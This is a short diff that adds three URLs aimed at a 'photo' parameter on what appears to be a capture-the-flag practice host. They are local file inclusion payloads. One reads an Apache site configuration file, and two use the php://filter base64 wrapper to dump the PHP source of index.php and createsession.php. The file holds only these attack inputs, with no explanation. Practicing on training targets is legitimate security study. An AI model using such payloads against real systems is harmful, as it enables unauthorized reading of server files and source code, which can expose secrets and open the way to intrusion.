@@ -1,0 +1,5 @@
+http://yoda.hackingarena.com:802/photo/index.php?photo=/etc/apache2/sites-available/000-default.conf
+
+http://yoda.hackingarena.com:802/photo/index.php?photo=php://filter/convert.base64-encode/resource=/var/www/site/index.php
+
+http://yoda.hackingarena.com:802/photo/index.php?photo=php://filter/convert.base64-encode/resource=/var/www/site/createsession.php
